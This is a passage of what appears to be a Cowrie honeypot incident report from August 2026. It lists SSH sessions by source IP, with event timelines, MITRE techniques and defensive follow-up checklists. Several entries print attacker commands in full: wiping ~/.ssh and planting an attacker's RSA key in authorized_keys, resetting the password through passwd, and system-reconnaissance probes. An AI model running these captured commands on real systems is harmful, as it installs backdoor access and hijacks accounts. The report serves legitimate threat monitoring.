| **Source IP** | `101.96.209[.]234` |
| **First Seen** | 2026-08-19 11:56 |
| **Last Seen** | 2026-08-19 11:57 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "yusuf\nKOQzaQShmBkH\nKOQzaQShmBkH"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:56:36` | `cowrie.session.connect` |
| `2026-08-19 11:56:37` | `cowrie.client.version` |
| `2026-08-19 11:56:37` | `cowrie.client.kex` |
| `2026-08-19 11:56:38` | `cowrie.login.success` |
| `2026-08-19 11:56:39` | `cowrie.session.params` |
| `2026-08-19 11:56:39` | `cowrie.command.input` |
| `2026-08-19 11:56:39` | `cowrie.command.failed` |
| `2026-08-19 11:56:40` | `cowrie.log.closed` |
| `2026-08-19 11:56:41` | `cowrie.session.params` |
| `2026-08-19 11:56:41` | `cowrie.command.input` |
| `2026-08-19 11:56:41` | `cowrie.session.file_download` |
| `2026-08-19 11:56:41` | `cowrie.log.closed` |
| `2026-08-19 11:56:58` | `cowrie.session.params` |
| `2026-08-19 11:56:58` | `cowrie.command.input` |
| `2026-08-19 11:56:58` | `cowrie.log.closed` |
| `2026-08-19 11:56:59` | `cowrie.session.params` |
| `2026-08-19 11:56:59` | `cowrie.command.input` |
| `2026-08-19 11:56:59` | `cowrie.command.input` |
| `2026-08-19 11:56:59` | `cowrie.command.failed` |
| `2026-08-19 11:57:00` | `cowrie.log.closed` |
| `2026-08-19 11:57:01` | `cowrie.session.params` |
| `2026-08-19 11:57:01` | `cowrie.command.input` |
| `2026-08-19 11:57:02` | `cowrie.log.closed` |
| `2026-08-19 11:57:03` | `cowrie.session.params` |
| `2026-08-19 11:57:03` | `cowrie.command.input` |
| `2026-08-19 11:57:03` | `cowrie.log.closed` |
| `2026-08-19 11:57:04` | `cowrie.session.params` |
| `2026-08-19 11:57:04` | `cowrie.command.input` |
| `2026-08-19 11:57:05` | `cowrie.log.closed` |
| `2026-08-19 11:57:05` | `cowrie.session.params` |
| `2026-08-19 11:57:05` | `cowrie.command.input` |
| `2026-08-19 11:57:05` | `cowrie.command.input` |
| `2026-08-19 11:57:06` | `cowrie.log.closed` |
| `2026-08-19 11:57:07` | `cowrie.session.params` |
| `2026-08-19 11:57:07` | `cowrie.command.input` |
| `2026-08-19 11:57:07` | `cowrie.log.closed` |
| `2026-08-19 11:57:08` | `cowrie.session.params` |
| `2026-08-19 11:57:08` | `cowrie.command.input` |
| `2026-08-19 11:57:08` | `cowrie.log.closed` |
| `2026-08-19 11:57:09` | `cowrie.session.params` |
| `2026-08-19 11:57:09` | `cowrie.command.input` |
| `2026-08-19 11:57:10` | `cowrie.log.closed` |
| `2026-08-19 11:57:11` | `cowrie.session.params` |
| `2026-08-19 11:57:11` | `cowrie.command.input` |
| `2026-08-19 11:57:11` | `cowrie.log.closed` |
| `2026-08-19 11:57:12` | `cowrie.session.params` |
| `2026-08-19 11:57:12` | `cowrie.command.input` |
| `2026-08-19 11:57:13` | `cowrie.log.closed` |
| `2026-08-19 11:57:14` | `cowrie.session.params` |
| `2026-08-19 11:57:14` | `cowrie.command.input` |
| `2026-08-19 11:57:14` | `cowrie.log.closed` |
| `2026-08-19 11:57:15` | `cowrie.session.params` |
| `2026-08-19 11:57:15` | `cowrie.command.input` |
| `2026-08-19 11:57:16` | `cowrie.log.closed` |
| `2026-08-19 11:57:16` | `cowrie.session.params` |
| `2026-08-19 11:57:16` | `cowrie.command.input` |
| `2026-08-19 11:57:17` | `cowrie.log.closed` |
| `2026-08-19 11:57:18` | `cowrie.session.params` |
| `2026-08-19 11:57:18` | `cowrie.command.input` |
| `2026-08-19 11:57:18` | `cowrie.log.closed` |
| `2026-08-19 11:57:19` | `cowrie.session.params` |
| `2026-08-19 11:57:19` | `cowrie.command.input` |
| `2026-08-19 11:57:19` | `cowrie.log.closed` |
| `2026-08-19 11:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.209[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.96.209[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ded9cf07d4

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:00 |
| **Last Seen** | 2026-08-19 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:00:23` | `cowrie.session.connect` |
| `2026-08-19 12:00:23` | `cowrie.client.version` |
| `2026-08-19 12:00:23` | `cowrie.client.kex` |
| `2026-08-19 12:00:23` | `cowrie.login.success` |
| `2026-08-19 12:00:24` | `cowrie.session.params` |
| `2026-08-19 12:00:24` | `cowrie.command.input` |
| `2026-08-19 12:00:24` | `cowrie.log.closed` |
| `2026-08-19 12:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62b98640ccf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:01 |
| **Last Seen** | 2026-08-19 12:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:01:28` | `cowrie.session.connect` |
| `2026-08-19 12:01:28` | `cowrie.client.version` |
| `2026-08-19 12:01:28` | `cowrie.client.kex` |
| `2026-08-19 12:01:29` | `cowrie.login.success` |
| `2026-08-19 12:01:31` | `cowrie.session.params` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.success` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.command.input` |
| `2026-08-19 12:01:31` | `cowrie.log.closed` |
| `2026-08-19 12:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712c24afab1d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:03 |
| **Last Seen** | 2026-08-19 12:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:03:42` | `cowrie.session.connect` |
| `2026-08-19 12:03:43` | `cowrie.client.version` |
| `2026-08-19 12:03:43` | `cowrie.client.kex` |
| `2026-08-19 12:03:45` | `cowrie.login.success` |
| `2026-08-19 12:03:47` | `cowrie.session.params` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.success` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:47` | `cowrie.command.input` |
| `2026-08-19 12:03:48` | `cowrie.log.closed` |
| `2026-08-19 12:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed30013b5d1e

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 12:03 |
| **Last Seen** | 2026-08-19 12:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:03:43` | `cowrie.session.connect` |
| `2026-08-19 12:03:44` | `cowrie.client.version` |
| `2026-08-19 12:03:44` | `cowrie.client.kex` |
| `2026-08-19 12:03:50` | `cowrie.login.success` |
| `2026-08-19 12:03:54` | `cowrie.session.params` |
| `2026-08-19 12:03:54` | `cowrie.command.input` |
| `2026-08-19 12:03:56` | `cowrie.log.closed` |
| `2026-08-19 12:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e386d49d690c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:05 |
| **Last Seen** | 2026-08-19 12:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:05:51` | `cowrie.session.connect` |
| `2026-08-19 12:05:51` | `cowrie.client.version` |
| `2026-08-19 12:05:51` | `cowrie.client.kex` |
| `2026-08-19 12:05:54` | `cowrie.login.success` |
| `2026-08-19 12:05:56` | `cowrie.session.params` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.success` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:56` | `cowrie.command.input` |
| `2026-08-19 12:05:57` | `cowrie.log.closed` |
| `2026-08-19 12:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a37533420e44

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:06 |
| **Last Seen** | 2026-08-19 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:06:19` | `cowrie.session.connect` |
| `2026-08-19 12:06:19` | `cowrie.client.version` |
| `2026-08-19 12:06:19` | `cowrie.client.kex` |
| `2026-08-19 12:06:20` | `cowrie.login.success` |
| `2026-08-19 12:06:20` | `cowrie.session.params` |
| `2026-08-19 12:06:20` | `cowrie.command.input` |
| `2026-08-19 12:06:20` | `cowrie.log.closed` |
| `2026-08-19 12:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69529411f053

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-19 12:06 |
| **Last Seen** | 2026-08-19 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:06:56` | `cowrie.session.connect` |
| `2026-08-19 12:06:56` | `cowrie.client.version` |
| `2026-08-19 12:06:56` | `cowrie.client.kex` |
| `2026-08-19 12:06:57` | `cowrie.login.success` |
| `2026-08-19 12:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4afc1f1b7c2d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-19 12:06 |
| **Last Seen** | 2026-08-19 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:06:56` | `cowrie.session.connect` |
| `2026-08-19 12:06:56` | `cowrie.client.version` |
| `2026-08-19 12:06:56` | `cowrie.client.kex` |
| `2026-08-19 12:06:57` | `cowrie.login.success` |
| `2026-08-19 12:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2765167df0aa

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-08-19 12:07 |
| **Last Seen** | 2026-08-19 12:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:07:43` | `cowrie.session.connect` |
| `2026-08-19 12:07:44` | `cowrie.client.version` |
| `2026-08-19 12:07:44` | `cowrie.client.kex` |
| `2026-08-19 12:07:45` | `cowrie.login.success` |
| `2026-08-19 12:07:46` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4526a073c94

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-19 12:07 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:07:56` | `cowrie.session.connect` |
| `2026-08-19 12:07:56` | `cowrie.client.version` |
| `2026-08-19 12:07:56` | `cowrie.client.kex` |
| `2026-08-19 12:07:58` | `cowrie.login.success` |
| `2026-08-19 12:07:59` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20cd43a8ae5d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:01` | `cowrie.session.connect` |
| `2026-08-19 12:08:01` | `cowrie.client.version` |
| `2026-08-19 12:08:01` | `cowrie.client.kex` |
| `2026-08-19 12:08:03` | `cowrie.login.success` |
| `2026-08-19 12:08:05` | `cowrie.session.params` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.success` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:05` | `cowrie.command.input` |
| `2026-08-19 12:08:07` | `cowrie.log.closed` |
| `2026-08-19 12:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef87f4d9aa4

| Field | Detail |
|---|---|
| **Source IP** | `182.76.43[.]24` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:13` | `cowrie.session.connect` |
| `2026-08-19 12:08:13` | `cowrie.client.version` |
| `2026-08-19 12:08:13` | `cowrie.client.kex` |
| `2026-08-19 12:08:14` | `cowrie.login.success` |
| `2026-08-19 12:08:15` | `cowrie.session.params` |
| `2026-08-19 12:08:15` | `cowrie.command.input` |
| `2026-08-19 12:08:15` | `cowrie.command.failed` |
| `2026-08-19 12:08:16` | `cowrie.log.closed` |
| `2026-08-19 12:08:17` | `cowrie.session.params` |
| `2026-08-19 12:08:17` | `cowrie.command.input` |
| `2026-08-19 12:08:17` | `cowrie.session.file_download` |
| `2026-08-19 12:08:17` | `cowrie.log.closed` |
| `2026-08-19 12:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.43[.]24` to AbuseIPDB if not already reported
- [ ] Block `182.76.43[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adf873b59cf

| Field | Detail |
|---|---|
| **Source IP** | `182.76.43[.]24` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:17` | `cowrie.session.connect` |
| `2026-08-19 12:08:17` | `cowrie.client.version` |
| `2026-08-19 12:08:18` | `cowrie.client.kex` |
| `2026-08-19 12:08:19` | `cowrie.login.success` |
| `2026-08-19 12:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.43[.]24` to AbuseIPDB if not already reported
- [ ] Block `182.76.43[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37caed779e80

| Field | Detail |
|---|---|
| **Source IP** | `182.76.43[.]24` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:19` | `cowrie.session.connect` |
| `2026-08-19 12:08:19` | `cowrie.client.version` |
| `2026-08-19 12:08:19` | `cowrie.client.kex` |
| `2026-08-19 12:08:21` | `cowrie.login.success` |
| `2026-08-19 12:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.43[.]24` to AbuseIPDB if not already reported
- [ ] Block `182.76.43[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7e12c94b42

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:47` | `cowrie.session.connect` |
| `2026-08-19 12:08:48` | `cowrie.client.version` |
| `2026-08-19 12:08:48` | `cowrie.client.kex` |
| `2026-08-19 12:08:50` | `cowrie.login.success` |
| `2026-08-19 12:08:51` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8a6628c1dbd

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-08-19 12:08 |
| **Last Seen** | 2026-08-19 12:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:08:58` | `cowrie.session.connect` |
| `2026-08-19 12:08:58` | `cowrie.client.version` |
| `2026-08-19 12:08:58` | `cowrie.client.kex` |
| `2026-08-19 12:09:00` | `cowrie.login.success` |
| `2026-08-19 12:09:01` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81ab81244b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
